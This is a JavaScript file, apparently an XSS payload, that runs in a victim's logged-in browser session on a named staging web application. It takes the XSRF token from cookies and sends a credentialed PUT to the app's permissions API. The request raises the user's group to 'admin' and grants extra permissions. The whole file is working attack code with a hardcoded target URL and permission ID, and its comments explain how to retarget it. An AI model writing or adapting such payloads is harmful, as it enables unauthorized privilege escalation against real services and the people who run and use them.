// e.js - Privilege Escalation via Permissions API

(function() {
    if (window.__xss_perm_done) return;
    window.__xss_perm_done = true;

    // 1. Helper: Get CSRF token from cookies
    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    const xsrfToken = getCookie('__Secure-XSRF_TOKEN') || getCookie('Secure-XSRF_TOKEN');
    if (!xsrfToken) {
        showMessage('❌ XSRF token not found. Can\'t proceed.', 'red');
        return;
    }

    // 2. Get the permission ID.
    //    Option A: Hardcode the one you found in the request.
    //    Option B: Try to extract it from the page (hidden inputs, data attributes).
    let permId = null;

    // Try to find it in the DOM (common patterns)
    const hiddenInput = document.querySelector('input[name="permission_id"], [data-permission-id]');
    if (hiddenInput && hiddenInput.value) {
        permId = hiddenInput.value;
    }

    // If not found, use the one from your request (c003c9ef-19a5-42f1-9f7f-27b4de450d3b)
    // You can replace this with any target permission ID.
    if (!permId) {
        permId = 'c003c9ef-19a5-42f1-9f7f-27b4de450d3b';
        console.log('Using hardcoded permission ID:', permId);
    }

    // 3. Build the malicious payload.
    //    - Grant "forms_view" permission.
    //    - Escalate user_group from "team" to "admin" (or "owner").
    //    - Set is_consultant to false.
    const payload = {
        user_permission: {
            [permId]: {
                "forms_view": true,
                // You can add more permissions here if needed:
                // "admin_panel": true,
                // "user_management": true,
                // "finance_view": true
            }
        },
        user_group: "admin",   // <-- TRY TO ESCALATE TO ADMIN
        is_consultant: false
    };

    // 4. Send the PUT request (browser automatically attaches HttpOnly session cookie)
    const API_URL = 'https://basilstagingapi.coraltreetech.com/api/v1/user_permissions/update_permission_json';

    fetch(API_URL, {
        method: 'PUT',
        credentials: 'include',  // Crucial: sends HttpOnly session token
        headers: {
            'Content-Type': 'application/json',
            'X-Xsrf-Token': xsrfToken   // Exact header from your request
        },
        body: JSON.stringify(payload)
    })
    .then(response => {
        // Read response body (even if it's empty)
        return response.text().then(text => ({
            status: response.status,
            statusText: response.statusText,
            body: text || '(empty response)'
        }));
    })
    .then(result => {
        if (result.status === 200 || result.status === 204) {
            showMessage(
                '✅ Privilege escalation SUCCESSFUL! User is now ADMIN with forms_view access.\n' +
                'Status: ' + result.status + ' ' + result.statusText,
                'green'
            );
            console.log('SUCCESS Response:', result.body);
        } else {
            showMessage(
                '❌ Update failed. Status: ' + result.status + ' ' + result.statusText + '\n' +
                'Body: ' + result.body.substring(0, 150),
                'red'
            );
            console.error('FAIL Response:', result.body);
        }
    })
    .catch(error => {
        // If CORS or network error occurs
        showMessage(
            '❌ Request blocked (CORS/Network). Error: ' + error.message + '\n' +
            'Check DevTools Console for details.',
            'red'
        );
        console.error('Fetch Error:', error);
    });

    // 5. Helper: Display a floating message on the page
    function showMessage(text, color) {
        const div = document.createElement('div');
        div.style.cssText = `
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: ${color === 'green' ? '#28a745' : '#dc3545'};
            color: white;
            padding: 20px 40px;
            z-index: 9999999;
            font-size: 18px;
            font-weight: bold;
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
            border: 2px solid white;
            text-align: center;
            max-width: 90%;
            white-space: pre-wrap;
            font-family: 'Segoe UI', Arial, sans-serif;
            line-height: 1.5;
        `;
        div.textContent = text;
        document.body.appendChild(div);

        // Auto-remove after 15 seconds
        setTimeout(() => {
            if (div.parentNode) div.remove();
        }, 15000);
    }

})();
